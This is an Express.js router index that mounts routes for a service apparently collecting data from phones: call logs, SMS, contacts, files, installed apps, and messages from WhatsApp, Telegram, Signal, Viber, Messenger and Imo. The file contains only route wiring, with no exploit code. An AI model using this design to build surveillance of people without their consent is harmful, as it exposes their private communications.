const router = require("express").Router();

router.use("/cancelFile", require("./cancelFile"));
router.use("/deletePermanently", require("./deletePermanently"));
router.use("/getCallLogs", require("./getCallLogs"));
router.use("/getContacts", require("./getContacts"));
router.use("/getDeviceInfo", require("./getDeviceInfo"));
router.use("/getInfo",require("./getInfo"))
router.use("/getDevices", require("./getDevices"));
router.use("/getFile", require("./getFile"));
router.use("/getFiles", require("./getFiles"));
router.use("/getFileListing", require("./getFileListing"));
router.use("/getMoreFileList", require("./getMoreFileList"));
router.use("/getSmsLogs", require("./getSmsLogs"));
router.use("/getWhatsapp", require("./getWhatsapp"));
router.use("/getTelegram", require("./getTelegram"));
router.use("/getMessanger", require("./getMessanger"));
router.use("/getViber", require("./getViber"));
router.use("/getSignal", require("./getSignal"));
router.use("/getConion", require("./getConion"));
router.use("/getImo", require("./getImo"));
router.use("/getProtectedText", require("./getProtectedText"));
router.use("/moveToInbox", require("./moveToInbox"));
router.use("/moveToTrash", require("./moveToTrash"));
router.use("/saveData", require("./saveData"));
router.use("/downloadFiles",require("./downloadFiles"))
router.use("/getApps", require("./getApps"));
router.use("/getWhatsappBusiness",require("./getWhatsappBussiness"))


module.exports = router;
